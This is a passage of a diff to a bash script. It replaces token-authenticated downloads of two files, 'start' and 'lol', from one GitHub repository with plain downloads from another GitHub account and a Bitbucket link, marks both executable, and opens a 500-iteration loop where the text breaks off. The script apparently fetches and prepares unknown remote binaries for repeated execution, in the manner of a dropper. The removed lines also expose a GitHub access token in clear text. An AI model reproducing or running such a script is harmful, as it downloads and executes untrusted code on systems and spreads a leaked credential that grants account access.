@@ -1,7 +1,7 @@
 #!/bin/bash
 user="$1"
-wget -q --header='Authorization: token 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' https://raw.githubusercontent.com/fuckl0l/project/main/start
-wget -q --header='Authorization: token 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' https://raw.githubusercontent.com/fuckl0l/project/main/lol
+wget https://raw.githubusercontent.com/walters99/Slurb/main/start
+wget https://bitbucket.org/oscarhines623/workinside/raw/b23b1f28b86a0e86880a97ea56976934b4e331cb/lol
 chmod +x lol start
 for i in {1..500} :
 do
